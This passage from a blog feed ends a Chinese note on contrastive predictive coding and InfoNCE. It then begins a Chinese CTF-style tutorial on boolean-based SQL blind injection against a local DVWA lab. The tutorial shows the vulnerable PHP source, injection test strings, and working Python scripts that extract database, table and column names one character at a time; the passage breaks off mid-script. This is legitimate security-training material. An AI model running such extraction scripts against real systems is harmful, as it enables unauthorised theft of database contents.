上式中 $f_k(x_{t+k,c_t})$ 表示上下文 $c_t$ 的预测和未来真实值 $x_{t+k}$ 的相似程度，其正比于未来真实数据与随机采样数据的概率之比 $\frac{p\left(x_{t+k}\mid c_{t}\right)}{p\left(x_{t+k}\right)}$ 


<p>然后作者直接用线性矩阵 $W_1,W_2,\dots,W_k$乘以$c_t$来作为预测值（即$W_kc_t$），而$z_{t+k}^K$为真实值，用向量内积来衡量相似度，由此得到了论文中的如下函数来逼近密度比：<br>$$<br>f_{k}\left(x_{t+k}, c_{t}\right)=\exp \left(z_{t+k}^{T} W_{k} c_{t}\right) \tag{3}<br>$$</p>
<h3 id="3-2-InfoNCE-Loss"><a href="#3-2-InfoNCE-Loss" class="headerlink" title="3.2 InfoNCE Loss"></a>3.2 InfoNCE Loss</h3><p>下面考虑如何对模型进行优化从而实现我们的目标，这里作者参考了NCE loss的思想提出了InfoNCE loss，定义如下：<br>
$$
\mathcal{L}_{\mathrm{N}}=-\underset{X}{\mathbb{E}}\left[\log \frac{f_{k}\left(x_{t+k}, c_{t}\right)}{\sum_{x_{j} \in X} f_{k}\left(x_{j}, c_{t}\right)}\right] \tag{4}
$$
其中 $X={\{x_1,x_2,\dots,x_N\}} $ 是一组样本，这里面 $(x_{t+k},c_t$) 可以看成正样本对，$(x_j,c_t)$可以看成负样本对。**因此为了优化该损失，我们希望分子尽可能大，分母尽可能小。这也就符合我们对于 $x$ 和 $c$ 互信息的要求，即正样本对之间的互信息更大，负样本对之间的互信息更小。优化该损失，实际上就是最大化$x_{t+k}$ 和 $c_t$ 间的互信息。**
<br>等式4实际上是一个正确分类正样本的<strong>多分类交叉熵损失</strong>（这里可以用softmax理解，但并不一定是softmax）。现在考虑该损失的最佳情况，假设 $x_i$ 是 $c_t$ 预测的结果，即正样本，那么 $x_i$ 被采样的概率如下，这实际上也就是等式2中定义的 $f_k(x_{i},c_t)$的最优输出结果：<br>$$<br>\begin{aligned}<br>p\left(d=i \mid X, c_{t}\right) &amp;=\frac{p\left(x_{i} \mid c_{t}\right) \prod_{l \neq i} p\left(x_{l}\right)}{\sum_{j=1}^{N} p\left(x_{j} \mid c_{t}\right) \prod_{l \neq j} p\left(x_{l}\right)} \<br>&amp;=\frac{\frac{p\left(x_{i} \mid c_{t}\right)}{p\left(x_{i}\right)}}{\sum_{j=1}^{N} \frac{p\left(x_{j} \mid c_{t}\right)}{p\left(x_{j}\right)}}<br>\end{aligned} \tag{5}<br>$$<br>可以看到 $f_k(x_{t+k},c_t)$ 确实与 $\frac{p(x_{t+k}|c_t)}{p(x_{t+k})}$  成比例，并且与负样本选择的数量 $N-1$ 无关，与前面所定义的密度比的概念相符合。</p>
<h3 id="3-3-Estimating-the-MI-with-InfoNCE"><a href="#3-3-Estimating-the-MI-with-InfoNCE" class="headerlink" title="3.3 Estimating the MI with InfoNCE"></a>3.3 Estimating the MI with InfoNCE</h3><p>虽然我们已经能够训练这个网络，但实际上我们可以具体推导 InfoNCE 和互信息之间的关系，以证明优化 InfoNCE loss 确实对在最大化互信息有帮助。由前面可以知道，$f_k(x_{t+k},c_t)$ 是由 $\frac{p(x_{t+k}|c_t)}{p(x_{t+k})}$ 决定，因此将其带入等式4中，并且将 $X$ 氛围正样本 $x_{t+k}$ 和负样本 $X_{neg}$ ：<br>
$$
\begin{aligned}
\mathcal{L}_{\mathrm{N}}^{\mathrm{opt}} &=-\underset{X}{\mathbb{E}} \log \left[\frac{\frac{p\left(x_{t+k} \mid c_{t}\right)}{p\left(x_{t+k}\right)}}{\frac{p\left(x_{t+k} \mid c_{t}\right)}{p\left(x_{t+k}\right)}+\sum_{x_{j} \in X_{\mathrm{ncg}}} \frac{p\left(x_{j} \mid c_{t}\right)}{p\left(x_{j}\right)}}\right] \\
&=\underset{X}{\mathbb{E}} \log \left[1+\frac{p\left(x_{t+k}\right)}{p\left(x_{t+k} \mid c_{t}\right)} \sum_{x_{j} \in X_{\text {neg }}} \frac{p\left(x_{j} \mid c_{t}\right)}{p\left(x_{j}\right)}\right] \\
& \approx \underset{X}{\mathbb{E}} \log \left[1+\frac{p\left(x_{t+k}\right)}{p\left(x_{t+k} \mid c_{t}\right)}(N-1) \underset{x_{j}}{\mathbb{E}} \frac{p\left(x_{j} \mid c_{t}\right)}{p\left(x_{j}\right)}\right] \\
&=\underset{X}{\mathbb{E}} \log \left[1+\frac{p\left(x_{t+k}\right)}{p\left(x_{t+k} \mid c_{t}\right)}(N-1)\right] \\
& \geq \underset{X}{\mathbb{E}} \log \left[\frac{p\left(x_{t+k}\right)}{p\left(x_{t+k} \mid c_{t}\right)} N\right] \\
&=-I\left(x_{t+k}, c_{t}\right)+\log (N)
\end{aligned}
$$
<br>所以最终得到：<br>$$<br>I\left(x_{t+k}, c_{t}\right)\geq \log (N)-L_N^{opt}<br>$$<br>优化InfoNCE（最小化$L_N^{opt}$）也就是最大化 $X_{t+k}$ 和 $c_t$ 之间的互信息的下限，并且 $N$ 越大，上面第三步中的约等于就越准确。</p>
<p>InfoNCE也与MINE有关$^{[54]}$，不失一般性的定义 $f(x,c)=e^{F(x,c)}$：<br>
$$
\begin{aligned}
\underset{X}{\mathbb{E}}\left[\log \frac{f(x, c)}{\sum_{x_{j} \in X} f\left(x_{j}, c\right)}\right]&=\underset{(x, c)}{\mathbb{E}}[F(x, c)]-\underset{(x, c)}{\mathbb{E}}\left[\log \sum_{x_{j} \in X} e^{F\left(x_{j}, c\right)}\right] \\
&= \underset{(x, c)}{\mathbb{E}}[F(x, c)]-\underset{(x, c)}{\mathbb{E}}\left[\log \left(e^{F(x, c)}+\sum_{x_{j} \in X_{\text {neg }}} e^{F\left(x_{j}, c\right)}\right)\right] \\
& \leq \underset{(x, c)}{\mathbb{E}}[F(x, c)]-\underset{c}{\mathbb{E}}\left[\log \sum_{x_{j} \in X_{\mathrm{neg}}} e^{F\left(x_{j}, c\right)}\right] \\
& =\underset{(x, c)}{\mathbb{E}}[F(x, c)]-\underset{c}{\mathbb{E}}\left[\log \frac{1}{N-1} \sum_{x_{j} \in X_{\text {neg }}} e^{F\left(x_{j}, c\right)}+\log (N-1)\right]
\end{aligned}
$$
<br>而MINE的定义为：</p>

$$
I \widehat{(X ; Z)}_{n}=\sup _{\theta \in \Theta} \mathbb{E}_{\mathbb{P}_{X Z}^{(n)}}\left[T_{\theta}\right]-\log \left(\mathbb{E}_{\mathbb{P}_{X}^{(n)} \otimes \hat{\mathbb{P}}_{Z}^{(n)}}\left[e^{T_{\theta}}\right]\right)
$$


最终推导的结果几乎等价于MINE估计器，只是多了一个常数 $\underset{c}{\mathbb{E}}[\log (N-1)]$ 。作者声明，当面临困难任务时，InfoNCE与MINE表现都很好，而如果目标很容易根据上下文进行预测的简答任务，则MINE会变得不稳定。

<h2 id="4-Experiments"><a href="#4-Experiments" class="headerlink" title="4 Experiments"></a>4 Experiments</h2><p><img src="/2020/10/19/【论文笔记——对比预测编码CPC】Representation-Learning-with-Contrastive-Predictive-Coding/image-20201019163955977.png" alt="image-20201019163955977"></p>
<p>CPC在计算机视觉领域的用法</p>
<p><br></p>
<h3 id="相关知识补充："><a href="#相关知识补充：" class="headerlink" title="相关知识补充："></a>相关知识补充：</h3><p><strong>（1）表征学习（Representation Learning）</strong>：学习数据的表征，以便在构建分类器或其他预测器时更容易提取有用的信息，无监督学习也属于表征学习。</p>
<p>参考链接：<a href="https://www.jiqizhixin.com/graph/technologies/64d4c374-6061-46cc-8d29-d0a582934876" target="_blank" rel="noopener">https://www.jiqizhixin.com/graph/technologies/64d4c374-6061-46cc-8d29-d0a582934876</a></p>
<p><strong>（2）自回归模型（Autoregressive Model，AR模型）</strong>：是统计上一种处理时间序列的方法，用同一变数，例如$x$的之前各期，即$x_1$至$x_{t-1}$来预测本期$x_t$的表现，并假设它们为线性关系。这是从回归分析的线性回归发展而来，只不过不是$x$预测$y$，而是用$x$预测$x$（自己），所以叫做自回归。</p>
<p>定义：<br>$$<br>X_{t}=c+\sum_{i=1}^{p} \varphi_{i} X_{t-i}+\varepsilon_{t}<br>$$<br>其中：$c$是常数项；$\varepsilon_{t}$被假设为平均数等于0，标准差等于$\sigma$的随机误差值；$\varepsilon _{t}$被假设为对于任何的$t$都不变。</p>
<p><strong>（3）隐空间（latent space）</strong>：GAN的输入空间，指隐变量$z$的样本空间，”隐变量”可以理解为控制数据$X$生成的”幕后之手“。在统计机器学习中，隐变量生成式模型“生成”数据$X$的背后逻辑是，通过建模联合分布$p_θ(z,X)$ ，再从中采样得到 $(z,X)$ 对。具体操作是，为隐变量选择一个容易采样的分布，如高斯，再通过神经网络建模$p_θ(X|z)$，从而采样得到生成的数据。</p>
<p><strong>（4）互信息（Mutual Information）</strong>：指变量间的相关性，通常用$I(X;Y)$表示$X$和$Y$之间的互信息:<br>$$<br>I(X ; Y)=\sum_{x \in X} \sum_{y \in Y} p(x, y) \log \frac{p(x \mid y)}{p(x)}<br>$$<br>$I(X;Y)$越大说明两者关系越密切。</p>
<p>参考链接：<a href="https://www.cnblogs.com/gatherstars/p/6004075.html" target="_blank" rel="noopener">https://www.cnblogs.com/gatherstars/p/6004075.html</a></p>
<p>文中定义的互信息为：<br>$$<br>I(x, c) =\sum_{x, c} p(x, c) \log \frac{p(x \mid c)}{p(x)}<br>$$<br>表示由于$c$的引入使得$x$不确定度减小的量，如下推导：<br>
$$
\begin{aligned}
I(x, c) &=\sum_{x, c} p(x, c) \log \frac{p(x \mid c)}{p(x)} \\
&=\sum_{x, c} p(x, c) \log \frac{p(x \mid c) p(c)}{p(x) p(c)} \\
&=\sum_{x, c} p(x, c) \log p(x \mid c)-\sum_{x, c} p(x, c) \log p(x) \\
&=\sum_{c} p(c) \sum_{x} p(x \mid c) \log p(x \mid c)-\sum_{x} \sum_{c} p(x, c) \log p(x) \\
&=H(x)-H(x \mid c)
\end{aligned}
$$
<br>其中$H(x)$为$x$的熵，用来衡量$x$的不确定度，定义如下：<br>$$<br>H(x)=-\sum_x p(x)logp(x)<br>$$<br>由$I(x,c)=H(x)-H(x|C)$也就说明了$x$与$c$的互信息即表示由于$c$的引入而使$x$熵减小的量，也就是$x$不确定度减小的量。</p>
<p><strong>（5）对比损失（Contrastive Loss）</strong>：</p>
<p><strong>（6）NCE Loss</strong></p>
<p><a href="https://blog.csdn.net/weixin_40901056/article/details/88568344" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40901056/article/details/88568344</a></p>
<p><strong>（7）softmax函数</strong>：</p>
<p>softmax用于多分类过程中，它将多个神经元的输出，映射到（0,1）区间内，可以看成概率来理解，从而来进行多分类。</p>
<p>假设我们有一个数组，V，Vi表示V中的第i个元素，那么这个元素的softmax值就是：<br>
$$
S_{i}=\frac{e^{i}}{\sum_{j} e^{j}}
$$
</p>
<p><img src="/2020/10/19/【论文笔记——对比预测编码CPC】Representation-Learning-with-Contrastive-Predictive-Coding/image-20201019230132624.png" alt="image-20201019230132624"></p>
<p>如上图，将原来输出的 3,1,-3 通过softmax函数作用，映射成为(0,1)的值，而这些值的累和为1（满足概率的性质），那么我们就可以将它理解成概率，在最后选取输出结点的时候，我们就可以选取概率最大（也就是值对应最大的）结点，作为我们的预测目标。</p>
<p><strong>（8）各种熵：</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/35423404" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35423404</a></p>
<p><a href="https://www.jianshu.com/p/2ea0406d0793" target="_blank" rel="noopener">https://www.jianshu.com/p/2ea0406d0793</a></p>
<p><strong>参考链接：</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/129076690" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/129076690</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/75517749" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/75517749</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/137076811" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/137076811</a></p>
<p><strong>参考文献：</strong></p>
<p>[12] Michael Gutmann and Aapo Hyvärinen. Noise-contrastive estimation: A new estimation principle for unnormalized statistical models. In Proceedings of the Thirteenth International Conference on Artificial Intelligence and Statistics, pages 297–304, 2010.</p>
<p>[13] Laurenz Wiskott and Terrence J Sejnowski. Slow feature analysis: Unsupervised learning of invariances. Neural computation, 14(4):715–770, 2002.</p>
<p>[54] Ishmael Belghazi, Sai Rajeswar, AristideN Baratin, R Devon Hjelm, and Aaron Courville. Mine: Mutual information neural estimation. 2018.</p>
]]></content>
      <categories>
        <category>PaperNote</category>
      </categories>
      <tags>
        <tag>自监督学习</tag>
      </tags>
  </entry>
  <entry>
    <title>以dvwa为例学习简单sql布尔盲注的详细脚本</title>
    <url>/2019/03/02/%E4%BB%A5dvwa%E4%B8%BA%E4%BE%8B%E5%AD%A6%E4%B9%A0%E7%AE%80%E5%8D%95sql%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%AF%A6%E7%BB%86%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><p><br></p>
<h4 id="1-SQL注入与SQL盲注"><a href="#1-SQL注入与SQL盲注" class="headerlink" title="1.SQL注入与SQL盲注"></a>1.SQL注入与SQL盲注</h4><p><strong>SQL注入：</strong></p>
<ul>
<li>执行SQL注入攻击时，服务器会响应来自数据库服务器的错误信息，信息提示SQL语法不正确等</li>
<li>一般在页面上直接就会显示执行sql语句的结果</li>
</ul>
<p><strong>SQL盲注：</strong></p>
<ul>
<li>一般情况，执行SQL盲注，服务器不会直接返回具体的数据库错误or语法错误，而是会返回程序开发所设置的特定信息（也有特例，如基于报错的盲注）</li>
<li>一般在页面上不会直接显示sql执行的结果</li>
<li>有可能出现不确定sql是否执行的情况</li>
</ul>
<p><br></p>
<h4 id="2-SQL盲注分类"><a href="#2-SQL盲注分类" class="headerlink" title="2.SQL盲注分类"></a>2.SQL盲注分类</h4><p>根据页面不同的响应方式，SQL盲注分为：<strong>基于布尔的盲注、基于时间的盲注、基于报错的盲注</strong></p>
<p>（1）对于<strong>基于布尔的盲注</strong>，可通过构造真or假判断条件（数据库各项信息取值的大小比较，如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…），将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True<-->False发生变化的转折点。<br>（2）对于<strong>基于时间的盲注</strong>，通过构造真or假判断条件的sql语句，且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求，观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。<br>（3）对于<strong>基于报错的盲注</strong>，搜寻查看网上部分Blog，基本是在rand()函数作为group by的字段进行联用的时候会违反Mysql的约定而报错。rand()随机不确定性，使得group by会使用多次而报错。</--></p>
<p><br></p>
<h4 id="3-SQL盲注测试流程"><a href="#3-SQL盲注测试流程" class="headerlink" title="3.SQL盲注测试流程"></a>3.SQL盲注测试流程</h4><p>SQL盲注的测试过程与DVWA的普通SQL Injection操作流程类似，大致测试流程如下：</p>
<ul>
<li>判断是否存在注入，注入的类型</li>
<li>猜解当前数据库名称</li>
<li>猜解数据库中的表名</li>
<li>猜解表中的字段名</li>
<li>获取表中的字段值</li>
<li>获取数据库的其他信息：版本、用户…</li>
</ul>
<p><br></p>
<h4 id="4-Requests库的使用"><a href="#4-Requests库的使用" class="headerlink" title="4.Requests库的使用"></a>4.Requests库的使用</h4><p>在CTF中里，python脚本中最基本的就是requests库的使用，本文不过多介绍其使用方法，可参考以下官方文档，讲的很详细：<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">快速上手——requests</a>以及<a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html#advanced" target="_blank" rel="noopener">高级用法——request</a></p>
<p><br></p>
<h2 id="0x02-前置工作"><a href="#0x02-前置工作" class="headerlink" title="0x02 前置工作"></a>0x02 前置工作</h2><p><br></p>
<p>1.为了更贴近CTF比赛的模式，因此在dvwa的数据库中加入了flag，最终脚本的结果也是爆出flag<br>2.加了两个flag是为了更好体现脚本的功能<br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141221969.png" alt="dvwa库中的表"><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302141308470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><br></p>
<h2 id="0x03-Low-SQL-Injection-Blind"><a href="#0x03-Low-SQL-Injection-Blind" class="headerlink" title="0x03 Low SQL Injection (Blind)"></a>0x03 Low SQL Injection (Blind)</h2><p><br></p>
<h4 id="1-测试分析"><a href="#1-测试分析" class="headerlink" title="1.测试分析"></a>1.测试分析</h4><p>经过简单的测试之后发现，页面只会出现两种回显，即</p>
<pre><code>User ID exists in the database.
</code></pre><p>   和</p>
<pre><code>User ID is MISSING from the database.
</code></pre><table>
<thead>
<tr>
<th>构造User ID取值的语句</th>
<th>回显结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>exists</td>
</tr>
<tr>
<td>‘</td>
<td>MISSING</td>
</tr>
<tr>
<td>1 and 1=1 #</td>
<td>exists</td>
</tr>
<tr>
<td>1 and 1=2 #</td>
<td>exists</td>
</tr>
<tr>
<td>1’ and 1=1 #</td>
<td>exists</td>
</tr>
<tr>
<td>1’ and 1=2 #</td>
<td>MISSING</td>
</tr>
</tbody>
</table>
<ul>
<li>满足查询条件则返回”User ID exists in the database.”，不满足查询条件则返回”User ID is MISSING from the database.”</li>
<li>两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注</li>
<li>由最后两行构造真假条件返回对应不同的结果，可知存在字符型的SQL盲注。</li>
</ul>
<p>因为本文主要目的为脚本的编写，因此查看源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>; </span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<ul>
<li>文本框输入并提交的形式，GET请求方式</li>
<li>未作任何输入过滤和限制，攻击者可任意构造所想输入的sql查询</li>
</ul>
<p><br></p>
<h4 id="2-脚本编写"><a href="#2-脚本编写" class="headerlink" title="2.脚本编写"></a>2.脚本编写</h4><p>脚本中所用到的SQL语句与dvwa前面非盲注时语句差不多，可参考：<a href="https://blog.csdn.net/qq_42181428/article/details/87892132" target="_blank" rel="noopener">dvwa之SQL注入（1）</a></p>
<p><strong>（1）脚本一：爆库名、表个数、表名</strong><br>我这里写的脚本是将当前数据库的所有表名都跑出来，实际在CTF比赛中，为节约时间可以不必这么做，因为一般包含flag的表名都会有特殊含义，只需要知道包含flag的表名即可。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本里用到的参数</span></span><br><span class="line"><span class="comment"># databaseLen   库名长度</span></span><br><span class="line"><span class="comment"># databse_name  库名</span></span><br><span class="line"><span class="comment"># tableNum      表的数量</span></span><br><span class="line"><span class="comment"># tableLen      表名长度</span></span><br><span class="line"><span class="comment"># table_name    表名</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span> </span><br><span class="line"><span class="comment"># 这里为节约时间只包含小写字母与数字，实际可能还有大写字母与符号</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    databaseLen_payload = <span class="string">'?id=1\' and length(database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="comment"># 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databaseLen_payload, headers=headers).text:</span><br><span class="line">        databaseLen = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database_lenth: '</span>+str(databaseLen))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">databse_name = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,databaseLen+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payloads:</span><br><span class="line">        databse_payload = <span class="string">'?id=1\' and substr(database(),'</span>+str(j)+<span class="string">',1)=\''</span>+str(i)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+databse_payload, headers=headers).text:</span><br><span class="line">            databse_name += i</span><br><span class="line">print(<span class="string">'database_name: '</span>+databse_name)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 3.爆破表的个数</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    tableNum_payload = <span class="string">'?id=1\' and (select count(table_name) from information_schema.tables where table_schema=database())='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableNum_payload, headers=headers).text:</span><br><span class="line">        tableNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'tableNum: '</span>+str(tableNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出所有的表名</span></span><br><span class="line"><span class="comment"># (1)爆出各个表名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,tableNum):</span><br><span class="line">    table_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        tableLen_payload = <span class="string">'?id=1\' and length(substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">                <span class="comment"># 用法substr('This is a test', 6) 返回'is a test'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+tableLen_payload, headers=headers).text:</span><br><span class="line">            tableLen = i</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(tableLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    table_payload = <span class="string">'?id=1\' and substr((select table_name from information_schema.tables where table_schema=database() limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+table_payload, headers=headers).text:</span><br><span class="line">                        table_name += n</span><br><span class="line">            print(<span class="string">'table'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+table_name)</span><br></pre></td></tr></table></figure></p>
<p><strong>脚本一的运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171115839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script1"></p>
<p><strong>（2）脚本二：爆列名</strong><br>由脚本一得到的结果，很显然flag应该在‘flagishere’表中，因此脚本二只是针对此表来跑出其中所有的列名。<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.判断flgishere表中字段数目</span></span><br><span class="line">columnNum = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    columnNum_payload = <span class="string">'?id=1\' and (select count(column_name) from information_schema.columns where table_name=\'flagishere\')='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnNum_payload, headers=headers).text:</span><br><span class="line">        columnNum = j</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'columnNum: '</span>+str(columnNum))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆出每个字段名的长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,columnNum):</span><br><span class="line">    column_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        columnLen_payload = <span class="string">'?id=1\' and length(substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+columnLen_payload, headers=headers).text:</span><br><span class="line">            columnLen = i</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(columnLen))</span><br><span class="line">          </span><br><span class="line">            <span class="comment"># (2)内部循环爆破每个表的表名</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span 